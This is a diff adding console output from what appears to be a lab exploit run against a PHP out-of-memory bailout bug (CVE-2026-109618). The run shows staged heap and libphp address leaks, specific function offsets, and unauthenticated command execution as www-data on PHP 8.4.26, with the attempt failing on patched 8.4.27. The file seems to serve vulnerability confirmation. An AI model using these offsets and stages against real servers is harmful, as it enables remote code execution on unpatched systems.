@@ -1,0 +1,38 @@
+attacker-1  | ==============================================================
+attacker-1  |  CVE-2026-109618 - PHP OOM bailout -> stale state -> RCE
+attacker-1  |  GHSA-w8hw-w9fx-j79w  (lab)
+attacker-1  | ==============================================================
+attacker-1  | 
+attacker-1  | === 1/2  PHP 8.4.26 (vulnerable) ===
+attacker-1  | [*] target http://vuln/index.php cmd='id>/out/p'
+attacker-1  | [*] offsets zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+attacker-1  | [*] rotating worker
+attacker-1  | [*] stage 1: heap leak (1/5)
+attacker-1  | [+] Zend MM chunk base = 0x7f9dd0600000
+attacker-1  | [*] rotating worker
+attacker-1  | [*] stage 2: libphp leak (1/5)
+attacker-1  | [+] libphp base = 0x7f9dd2386000
+attacker-1  | [*] rotating worker
+attacker-1  | [*] stage 3: HTDATA=0x7f9dd06690d8 zif_system=0x7f9dd27eb370
+attacker-1  | [+] executed on attempt 1
+attacker-1  | PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+attacker-1  | 
+attacker-1  | === 2/2  PHP 8.4.27 (patched) ===
+attacker-1  | [*] target http://fixed/index.php cmd='id>/out/p'
+attacker-1  | [*] offsets zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+attacker-1  | [*] rotating worker
+attacker-1  | [*] stage 1: heap leak (1/2)
+attacker-1  | [*] rotating worker
+attacker-1  | [*] stage 1: heap leak (2/2)
+attacker-1  | [*] rotating worker
+attacker-1  | [-] heap leak failed
+attacker-1  | 
+attacker-1  | --------------------------------------------------------------
+attacker-1  |  Vulnerable proof (/out/p in the 8.4.26 worker):
+attacker-1  |    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+attacker-1  | --------------------------------------------------------------
+attacker-1  | ==============================================================
+attacker-1  |  RESULT: CONFIRMED
+attacker-1  |    PHP 8.4.26: unauthenticated code execution as www-data
+attacker-1  |    PHP 8.4.27: no code execution; target still healthy
+attacker-1  | ==============================================================
